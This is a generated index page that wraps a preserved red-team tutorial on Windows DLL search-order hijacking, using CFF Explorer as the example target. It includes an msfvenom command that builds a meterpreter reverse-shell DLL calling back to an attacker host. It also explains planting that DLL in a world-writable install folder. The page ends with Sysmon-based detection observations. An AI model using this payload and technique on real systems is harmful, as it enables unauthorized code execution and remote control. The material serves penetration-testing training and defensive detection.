---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# DLL Hijacking

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-privilege-escalation-t1038-dll-hijacking` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1038-dll-hijacking.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DLL Hijacking](../../topics/offensive-security/dll-hijacking.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-privilege-escalation-t1038-dll-hijacking |
| name | DLL Hijacking |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/privilege-escalation/t1038-dll-hijacking.md |

## Preserved Source Material

````yaml
_asset_filenames:
- dll-logs (1).png
- dll-missing.png
- dll-moved.png
- dll-noparent.png
- dll-rundll.png
- dll-shell.png
- dll-success.png
_body: '---

  description: DLL Search Order Hijacking for privilege escalation, code execution, etc.

  ---


  # DLL Hijacking


  ## Execution


  Generating a DLL that will be loaded and executed by a vulnerable program which connect back to the attacking system with
  a meterpreter shell:


  {% code title="attacker@kali" %}

  ```csharp

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil-meterpreter64.dll

  ```

  {% endcode %}


  To illustrate this attack, we will exploit our beloved tool `CFF Explorer.exe` . Once the program is executed, it attempts
  to load `CFF ExplorerENU.dll` from the location the program is installed to, however that DLL cannot be loaded (note the
  NAME NOT FOUND) as it does not exist in the given path:


  ![](../../.gitbook/assets/dll-missing.png)


  Luckily for the attacker, the location in which the DLL is being looked for - is world writable! Let''s move our evil DLL
  `evil-meterpreter64.dll` to `C:\Program Files\NTCore\Explorer Suite` and rename it to `CFF ExplorerENU.dll`&#x20;


  ![](../../.gitbook/assets/dll-moved.png)


  Launching the program again gives different results - DLL is found (SUCCESS):


  ![](../../.gitbook/assets/dll-success.png)


  which is good news for the attacker - the DLL code gets executed, which gives attacker a meterpreter shell:


  ![](../../.gitbook/assets/dll-shell.png)


  ## Observations


  On the victim system, we can only see rundll32 with no associated parent process and established connection - this should
  raise your suspicion immediately:


  ![](../../.gitbook/assets/dll-rundll.png)


  Looking at the rundll32 image info, we can see the current directory, which is helpful:


  ![](../../.gitbook/assets/dll-noparent.png)


  Looking at the sysmon logs gives us a better understanding of what happened - CFF Explorer.exe was started as a process
  `4856` which then kicked off a rundll32 (`1872`) which then established a connection to 10.0.0.5:


  ![](<../../.gitbook/assets/dll-logs (1).png>)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1038" %}


  {% embed url="https://pentestlab.blog/2017/03/27/dll-hijacking/" %}


  \'
_relative_path: offensive-security/privilege-escalation/t1038-dll-hijacking.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1038-dll-hijacking.md
````
